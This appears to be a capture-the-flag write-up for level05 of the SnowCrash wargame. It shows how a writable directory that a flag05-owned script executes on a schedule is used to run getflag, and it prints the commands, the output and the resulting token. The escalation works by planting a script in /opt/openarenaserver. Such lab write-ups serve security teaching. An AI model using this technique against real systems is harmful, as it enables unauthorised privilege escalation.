We look for files owned by the actual user or flag05 user, we find the following interesting ones:

level05@SnowCrash:~$ find / -user flag05  2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

We realize the openarenaserver is executing commands in /opt/openarenaserver path, but we cannot execute it since only flag05 user and group has execution permissions:

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

level05@SnowCrash:~$ ls -lah /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver


We realize we can write in /opt/openarenaserver path, so we create a script in /opt/openarenaserver/ that will get us the flag:
echo 'bash -c "getflag > /tmp/level04_flag"' > /opt/openarenaserver/level04.sh

After some time, the script is executed by openarenaserver and deleted. This scripts seems to be executed by some kind of chron job.

We successfuly get the flag in /tmp/level04_flag:

level05@SnowCrash:~$ cat /tmp/level04_flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
